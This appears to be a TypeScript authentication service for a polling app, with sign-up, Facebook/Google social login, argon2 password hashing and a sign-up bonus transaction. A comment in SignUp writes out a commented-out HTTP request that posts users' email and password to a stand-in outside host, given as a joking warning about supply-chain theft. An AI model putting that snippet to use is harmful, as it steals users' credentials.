import { Inject, Service } from 'typedi';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUserSignUpBody, Role } from '../interfaces/user';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { getRepository, Repository } from 'typeorm';
import { User } from '../entity/user';
import lodash from 'lodash';
import { Profile } from 'passport-facebook';
import { Profile as ProfileGoogle } from 'passport-google-oauth';
import generatePassword from 'generate-password';
import { AddVoiceByTypeTransaction } from '../transaction/addVoiceByType';
import { IAddVoiceByTypeBody } from '../interfaces/admin';
import { TransactionSource } from '../interfaces/poll-transaction';

@Service()
export default class AuthService {
  userRepository: Repository<User>;

  constructor(
    // private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
    this.userRepository = getRepository(User);
  }

  public async SignUp(userInputDTO: IUserSignUpBody): Promise<{ user: User }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      const userExist = await this.userRepository.findOne({ email: userInputDTO.email });
      if (userExist) {
        throw new Error('This email already used');
      }

      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const userRecord = await this.userRepository
        .create({
          email: userInputDTO.email,
          salt: salt.toString('hex'),
          password: hashedPassword,
          role: Role.User,
          username: `user${lodash.random(1000000, 9999999)}`,
        })
        .save();

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      //SignUp Voice Bonus
      const signUpBonusTransactionData: IAddVoiceByTypeBody = {
        userId: userRecord.id,
        amount: 20,
        source: TransactionSource.SignUpBonus,
      };
      await AddVoiceByTypeTransaction(signUpBonusTransactionData);
      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord;
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async loginOrSignUpSocial(profile: Profile | ProfileGoogle) {
    try {
      if (!profile.emails) {
        throw new Error('Facebook or Google No Email');
      }

      const userEmail = profile.emails[0].value;

      const userExist = await this.userRepository.findOne({ email: userEmail });
      if (userExist) {
        Reflect.deleteProperty(userExist, 'password');
        Reflect.deleteProperty(userExist, 'salt');
        return userExist;
      }

      const salt = randomBytes(32);

      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(
        generatePassword.generate({
          length: 12,
          numbers: true,
          symbols: true,
          lowercase: true,
          uppercase: true,
        }),
        { salt },
      );

      this.logger.silly('Creating user db record');
      const userRecord = await this.userRepository
        .create({
          email: userEmail,
          salt: salt.toString('hex'),
          password: hashedPassword,
          role: Role.User,
          username: `user${lodash.random(1000000, 9999999)}`,
        })
        .save();

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
      //SignUp Voice Bonus
      const signUpBonusTransactionData: IAddVoiceByTypeBody = {
        userId: userRecord.id,
        amount: 20,
        source: TransactionSource.SignUpBonus,
      };
      await AddVoiceByTypeTransaction(signUpBonusTransactionData);
      //
      const user = userRecord;
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return user;
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string, cb: Function) {
    try {
      const userRecord = await this.userRepository
        .createQueryBuilder('user')
        .where({ email: email })
        .addSelect('user.password')
        .addSelect('user.salt')
        .getOne();

      if (!userRecord) {
        return cb(null, false);
      }

      this.logger.silly('Checking password');
      const validPassword = await argon2.verify(userRecord.password, password);
      if (validPassword) {
        this.logger.silly('Password is valid!');
        const user = userRecord;
        Reflect.deleteProperty(user, 'password');
        Reflect.deleteProperty(user, 'salt');

        if (user.emailConfirmed === false) {
          return cb(new Error("Email didn't confirm"));
        }

        return cb(null, user);
      } else {
        return cb(null, false);
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }
}
